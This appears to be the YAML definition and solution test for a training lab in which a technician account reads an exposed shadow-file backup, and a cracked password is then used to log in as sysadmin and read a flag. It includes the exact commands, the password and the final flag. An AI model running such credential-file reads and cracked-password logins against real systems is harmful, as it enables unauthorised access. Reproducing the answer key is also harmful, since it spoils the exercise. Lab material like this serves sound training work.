topology:
  nodes:
    - id: "target"
      label: "Hosting Server"
      type: "server"
      ip_offset: "25"
      ports: [22]
      services: ["OpenSSH"]
      x: 2
      y: 1
  edges:
    - from: "attacker"
      to: "target"
      label: "SSH:22"
      access: "direct"

troubleshooting: "If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
defensive_takeaways: "Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution."
test:
  steps:
    - name: "SSH as technician"
      command: "sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@{target.target} 'whoami' 2>&1"
      expect: "technician"
      timeout: 15

    - name: "Discover exposed shadow backup"
      command: "sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@{target.target} 'cat /opt/ironforge/backups/shadow.bak | grep sysadmin | cut -d: -f1' 2>&1"
      expect: "sysadmin"
      timeout: 15

    - name: "Find token 1 in backup directory"
      command: "sshpass -p '{cred.technician.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.technician.user}@{target.target} 'cat /opt/ironforge/backups/assessment_token.txt' 2>&1"
      expect: "cr4ck3d"
      timeout: 15

    - name: "Switch to sysadmin with cracked password and read flag"
      command: "sshpass -p 'dragon' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null sysadmin@{target.target} 'cat /home/sysadmin/flag.txt' 2>&1"
      expect: "h4sh3s"
      timeout: 15

    - name: "Verify complete flag"
      command: "echo 'OCR{cr4ck3d_h4sh3s}'"
      expect: "OCR{cr4ck3d_h4sh3s}"
